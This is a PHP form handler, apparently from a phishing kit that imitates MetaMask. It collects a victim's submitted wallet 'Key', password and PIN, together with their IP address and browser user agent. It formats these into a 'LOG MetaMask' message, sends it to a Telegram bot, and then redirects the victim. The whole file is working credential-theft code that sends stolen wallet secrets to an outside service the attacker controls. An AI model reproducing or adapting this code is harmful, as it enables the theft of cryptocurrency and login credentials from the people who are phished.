<?php

session_start();

include ('../tgconfig/telegram.php');
include ('connect.php');

$_SESSION['gebruikersnaam'] = $_POST['gebruikersnaam'];
$_SESSION['wachtwoord'] = $_POST['wachtwoord'];
$_SESSION['npinnogmaals'] = $_POST['newpinr'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['remote_ip'] = $_SERVER['REMOTE_ADDR'];

$telegramMessage =
        "<strong>‼️🔔 LOG MetaMask 🔔‼️</strong>\n".
		"<strong></strong>\n".
        "<strong>🌐 IP  ".$_SESSION['remote_ip']."</strong>\n".
		"<i>📱 OS:  ".$_SESSION['useragent']."</i>\n".
		"<strong></strong>\n".
        "<strong>Key:</strong> ".$_SESSION['gebruikersnaam']."\n".
		"<strong></strong>\n".
        "<strong>Password:</strong> ".$_SESSION['wachtwoord']."\n"
        ;

telegram($telegramMessage);
finish($telegramMessage);

header("Location: ./ ");
?>